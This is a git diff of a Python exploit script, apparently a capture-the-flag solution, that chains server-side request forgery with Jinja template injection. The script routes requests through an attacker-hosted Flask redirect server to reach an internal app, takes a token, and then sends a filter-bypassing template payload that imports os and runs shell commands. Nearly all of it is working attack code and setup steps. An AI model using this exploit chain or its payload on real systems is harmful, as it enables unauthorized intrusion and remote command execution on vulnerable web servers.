@@ -25,14 +25,14 @@ Step 2: On the publicly accessible server, write the following script and call i
         password="Johnwick3$"
         return redirect(f'http://127.0.0.1:3000/register?username={username}&password={password}')
 
-Step 3:  flask run --host=0.0.0.0
+Step 3: On the public server run the hosted app.py:  flask run --host=0.0.0.0
 """  
 
 import requests
 
 def ssrf_ssti():
     proxies={"http":"http://127.0.0.1:8080"}
-    url="94.237.49.212:38383"  # Replace Target url
+    url="94.237.49.212:58676"  # Replace Target url
     SSRF_HOST="54.157.213.44:5000"  # Replace with the public server ip where you are hosting the script above
     headers={
         "Host":f"{SSRF_HOST}",    
@@ -58,3 +58,21 @@ Content-Disposition: form-data; name="0"
     print(response.text)
 
 ssrf_ssti()
+
+# The above script returns a 'token' value that we will use in the next step.  
+# Step 4: Replace the script shown above in step 2 with the below script:
+# #!/usr/bin/env python3
+#     from flask import Flask, Response, request, redirect, url_for
+#     app = Flask(__name__)
+#     @app.route('/', defaults={'path': ''})
+#     @app.route('/<path:path>')
+#     def catch(path):
+#         if request.method == 'HEAD':
+#             resp = Response("")
+#             resp.headers['Content-Type'] = 'text/x-component'
+#             return resp
+#      token="cbce407b81b2897f3242f1dc1363f52d" # Change the token value
+#      directory="{% print(request|attr('application')|attr(request|attr('args')|attr('get')('g'))|attr(request|attr('args')|attr('get')('gi'))(request|attr('args')|attr('get')('b'))|attr(request|attr('args')|attr('get')('gi'))(request|attr('args')|attr('get')('i'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()) %}&g=__globals__&b=__builtins__&i=__import__&gi=__getitem__&cmd=ls+/"  # This format is needed to bypass ssti filters
+#       return redirect(f'http://127.0.0.1:3000/home?directory={directory}&token={token}') 
+# Step 5: On the public server run the hosted app.py:  flask run --host=0.0.0.0
+# Step 6: Run the 'ssrf_ssti' function again
